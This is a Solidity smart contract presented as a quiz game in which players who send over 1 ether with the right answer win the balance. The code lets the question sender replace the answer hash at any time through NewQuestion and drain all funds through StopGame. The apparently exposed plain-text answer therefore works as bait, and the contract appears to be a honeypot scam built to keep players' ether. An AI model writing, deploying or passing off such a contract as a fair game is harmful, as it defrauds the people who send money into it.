 

pragma solidity ^0.4.19;

contract QUIZ_GAME
{
    string public Question;
	
	bytes32 responseHash;
	
	address questionSender;
	
    function StartGame(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            Question = _question;
            questionSender = msg.sender;
        }
    }
    
    function Play(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        responseHash = _responseHash;
        Question = _question;
    }
    
    function() public payable{}
}